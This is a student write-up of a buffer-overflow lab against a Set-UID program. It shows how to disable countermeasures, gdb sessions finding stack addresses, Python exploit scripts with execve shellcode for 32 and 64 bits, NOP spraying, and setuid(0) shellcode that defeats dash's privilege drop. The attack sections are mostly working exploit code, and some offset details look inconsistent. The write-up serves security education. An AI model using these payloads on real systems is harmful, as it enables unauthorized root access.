# Lab 7: Buffer Overflow Attack Lab (`Set-UID` Version)

Objective: develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why.

## Turning Off Countermeasures

Modern operating systems have implemented several security mechanisms to make the buffer-overflow attack difficult. To simplify our attacks, we need to disable them first. Later on, we will enable them and see whether our attack can still be successful or not.

### Address Space Randomization

Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command:
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

### Configuring /bin/sh

In the recent versions of Ubuntu OS, the `/bin/sh` symbolic link points to the `/bin/dash` shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a `Set-UID` process. Basically, if they detect that they are executed in a `Set-UID` process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.

We have installed a shell program called `zsh` in our Ubuntu 20.04 VM. The following command can be used to link `/bin/sh` to `zsh`:
```bash
sudo ln -sf /bin/zsh /bin/sh
 ```

### StackGuard and Non-Executable Stack. 

These are two additional countermeasures implemented in the system. They can be turned off during the compilation

![offcounter](/Lab7/countermeasures/off_counter.png)

## Exercise 1: Getting Familiar with Shellcode

The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program’s privilege. Shellcode is widely used in most code-injection attacks.

To demonstrate how this works, we have the `/Lab7/exercise1/call_shellcode.c` file, which, together with `/Lab7/exercise1/Makefile`, creates two copies of shellcode, one is 32-bit and the other is 64-bit.

By running `make`, we are using:

```bash
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
```
![make](/Lab7/exercise1/img/1.png)

We can see in the image that both binaries run without any problem despite working on a 64-bit VM. Modern Linux OS includes compatibility layers (such as the ia32-libs package) that allow them to run 32-bit binaries. This is accomplished through the use of system libraries that can handle the translation from 32-bit to 64-bit system calls.


If we make `/Lab7/exercise1/a32.out` and `/Lab7/exercise1/a64.out` root-owned `Set-UID` programs, we can obtain a root shell.

![make](/Lab7/exercise1/img/2.png)


## Exercise 2: Understanding the Vulnerable Program

The vulnerable program used in this lab is `/Lab7/exercise2/stack.c`. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain root privileges. 

```c
include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("==== Returned Properly ====\n");
    return 1;
}
```

By running `make`, we obtain:
![make](/Lab7/exercise2/img/1.png)

- `stack-LX`: 32-bit or 64 bit vulnerable programs for diferents levels (X).
- `stack-X-dbg`: 32-bit or 64 bit vulnerable program with debugging information added to the  for diferents levels (X).

## Exercise 3: Launching Attack on 32-bit Program (Level 1)


### Investigation

To exploit the buffer-overflow vulnerability in the target program, the most important thing to know is the distance between the buffer’s starting position and the place where the return-address is stored. We will use a debugging method to find it out. Since we have the source code of the target program, we can compile it with the debugging flag turned on. That will make it more convenient to debug.

```bash
[04/06/24]seed@VM:~/.../Lab7$ gdb stack-L1-dbg 
gdb-peda$ b bof
Breakpoint 1 at 0x80484c1: file stack.c, line 18.
gdb-peda$ run
...
Breakpoint 1, bof (
...
gdb-peda$ next
18	    strcpy(buffer, str); 
...
gdb-peda$ p &buffer
$1 = (char (*)[100]) 0xffffce9c
gdb-peda$ p $ebp
$2 = (void *) 0xffffcf08
```

Now we know that:
- buffer = 0xffffce9c
- ebp = 0xffffcf08
- offset = ebp - buffer + L
- ret = buffer + offset + 100

![attacks](/Lab7/exercise3/img/1.png)


### Launching Attacks

To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload and save it inside `/Lab7/exercise3/badfile`. 

We will utilize the `/Lab7/exercise3/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:

```python
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# In this example, we're assuming a 32-bit architecture.
L = 4

# Calculate the offset to place the return address right after the buffer (ebp - buffer + L)
offset = 0xffffcf08 - 0xffffce9c + L # The size of the buffer in the vulnerable program
# Return address (buffer + offset + buffersize).
ret = 0xffffce9c + offset + 100 
```

Finally running `/Lab7/exercise3/stack-L1` (the `Set-UID` program) will give us the root shell  due to copying excess data from the `badfile` which causes buffer overflow. By doing so, we can redirect the program's execution flow to a location controlled by `badfile`, 


![attacks](/Lab7/exercise3/img/2.png)

## Exercise 4: Launching Attack without Knowing Buffer Size (Level 2)

In this task, we are going to add a constraint: you can still use gdb, but you are not allowed to derive the buffer size from your investigation. Actually, the buffer size is provided in `Makefile`, but you are not allowed to use that information in your attack.

Your task is to get the vulnerable program to run your shellcode under this constraint. We assume that
you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful
to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four
(for 32-bit programs).

On this attack we will use the files created on `Exercise 2`, specially `/Lab7/exercise4/stack-L2` and `/Lab7/exercise4/stack-L2-dbg`.

To do this attack we will use `Spraying Technique`, it involves flooding the memory with a large number of shellcode this will increase the chances of successfully redirecting the program's execution flow to the `badfile`.

First we will use `gdb` to find the buffer address:
```bash
[04/06/24]seed@VM:~/.../ex4$ gdb stack-L2-dbg 
gdb-peda$ b bof
Breakpoint 1 at 0x80484c1: file stack.c, line 18.
gdb-peda$ run
...
Breakpoint 1, bof (
...
gdb-peda$ next
18	    strcpy(buffer, str); 
gdb-peda$ p &buffer
$1 = (char (*)[160]) 0xffffce60
```

![attacks](/Lab7/exercise4/img/1.png)

We will utilize the `/Lab7/exercise4/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:

```python
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# 32-bit architecture
L = 4

# Return address 
ret = 0xffffce60 + 400

# Spray the buffer with return address
for offset in range (50):
	content[offset*L:offset*L + L] = (ret).to_bytes(L, byteorder='little')
```

We use the spraying technique to construct the first `ret` bytes of the buffer, and we put 517 bytes of NOP afterward, followed by the malicious code. The value added to the buffer address is arbitrary, but since we know the range of the buffer is 100 to 200 bytes, we need to use a number larger than 200. Actually, because of the NOPs, any address between this value and the starting of the malicious code can be used. 

The loop iterates 50 times because we know that the buffer size is in the range of 100 to 200 bytes, and on a 32-bit architecture, each memory address occupies 4 bytes. Therefore, dividing the upper bound of the buffer range (200 bytes) by the size of each memory address (4 bytes) gives us 50 iterations. Additionally, we use `offset*L` as the initial index and `offset*L + L` as the final index to ensure that we align with memory boundaries, as values stored in the frame pointer are always multiples of four due to memory alignment considerations. 

![attacks](/Lab7/exercise4/img/2.png)

## Exercise 5: Launching Attack on 64-bit Program (Level 3)

To do the attack we use `gdb` to find the buffer and edp addres:
```bash
[04/06/24]seed@VM:~/.../ex5$ gdb stack-L3-dbg 
gdb-peda$ b bof
Breakpoint 1 at 0x80484c1: file stack.c, line 18.
gdb-peda$ run
...
Breakpoint 1, bof (...) at stack.c:14
14	{
gdb-peda$ next
...
18	    strcpy(buffer, str); 
gdb-peda$ p &buffer
$1 = (char (*)[200]) 0x7fffffffdce0
gdb-peda$ p $rbp
$2 = (void *) 0x7fffffffddb0
```

Now we know that:
- buffer = 0x7fffffffdce0
- rbp = 0x7fffffffddb0
- ret = buffer + start
- offset = rbp - buffer + 8

![attacks](/Lab7/exercise5/img/1.png)

Notice that use `p $rbp` instead of `p $edp` to access the base pointer register because we are workink on 64-bit architecture. For the same reaseon we add 8 instead of 4 to the offset.

The address you've chosen (buffer + start) does not contain zero bytes in the middle and thus is being copied correctly onto the stack.

The interval of `start` that I found effective ranges from 97 to 162. Initially, I started with 120 (as suggested by the book), then fine-tuned it through trial and error tests, centered around the initial value of 120.

We will utilize the `/Lab7/exercise5/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:

```python
# Shell code for 64-bit
shellcode= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Put the shellcode somewhere in the payload
start = 120            # It works for（97，162）
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
buffer = 0x7fffffffdce0
rbp = 0x7fffffffddb0
ret    = buffer + start         
offset = rbp - buffer + 8  

# 64-bit architecture
L = 4

content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
```

![attacks](/Lab7/exercise5/img/2.png)

## Exercise 6: Launching Attack on 64-bit Program (Level 4)

The target program (`/Lab7/exercise6/stack-L4`) in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this `Set-UID` program. 


To do the attack we use `gdb` to find the buffer and edp addres:
```bash
[04/06/24]seed@VM:~/.../ex6$ gdb stack-L4-dbg 
gdb-peda$ b bof
Breakpoint 1 at 0x11a9: file stack.c, line 14.
gdb-peda$ run
...
Breakpoint 1, bof (...) at stack.c:14
14	{
gdb-peda$ next
...
18	    strcpy(buffer, str); 
gdb-peda$ p $rbp
$1 = (void *) 0x7fffffffd990
gdb-peda$ p &buffer
$2 = (char (*)[10]) 0x7fffffffd986
```
![attacks](/Lab7/exercise6/img/1.png)

Due to the calculated buffer space being too small, it cannot accommodate the shellcode (which is 10 bytes in size). Therefore, the buffer in the bof function cannot be used here. Consequently, we redirect our attention to the `str` variable in the main function, which also stores the content of the shellcode. Therefore, we need to set the return address (`ret`) in the buffer to point to the shellcode within the `str` variable. It's important to note that breakpoints need to be reset because `str` is passed as a pointer to a pointer:

```bash
[04/06/24]seed@VM:~/.../ex6$ gdb stack-L4-dbg 
gdb-peda$ b main
Breakpoint 1 at 0x11a9: file stack.c, line 26.
gdb-peda$ run
...
Breakpoint 1, main (argc=0x0, argv=0x0) at stack.c:26
26	{
gdb-peda$ p &str
$1 = (char (*)[517]) 0x7fffffffddc0
```
![attacks](/Lab7/exercise6/img/2.png)

Now we know that:
- buffer = 0x7fffffffd986
- str = 0x7fffffffddc0
- rbp = 0x7fffffffd990
- offset = rbp - str + 8


We will utilize the `/Lab7/exercise6/exploit.py` program in order to do the attack. We will start with the base Python script provided in the lab setup and make the following modifications:

```python
shellcode= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)                  
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
str = 0x7fffffffddc0
buffer = 0x7fffffffd986
rbp = 0x7fffffffd990
ret    = str+start           
offset = rbp - buffer + 8              

# In this example, we're assuming a 64-bit architecture.
L = 8  

content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
```

![attacks](/Lab7/exercise6/img/3.png)


## Exercise 7: Defeating dash’s Countermeasure

To defeat the countermeasure in buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned `Set-UID` program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero. We can achieve this by invoking setuid(0) before executing `execve()` in the shellcode

First we compile `/Lab7/exercise7/call_shellcode.c` as `Set-UID` program without anu modification:

```c
const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;
```
And run a64.out and a32.out:
![attacks](/Lab7/exercise7/img/1.png)

As we can see, we are gettin a normal bash, not a root bash.

Now we change `/Lab7/exercise7/call_shellcode.c` to:
```c
const char shellcode[] =
#if __x86_64__
  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;
```
And run a64.out and a32.out again:
![attacks](/Lab7/exercise7/img/2.png)

After running the modified set-UID program with the updated shellcode, we successfully obtains a root shell, as indicated by the command prompt change from `$` to `#.`

To escalate privileges, the shellcode is modified to include additional instructions that escalate the process's privileges `before` spawning the shell.

## Exercise 8: Defeating Address Randomization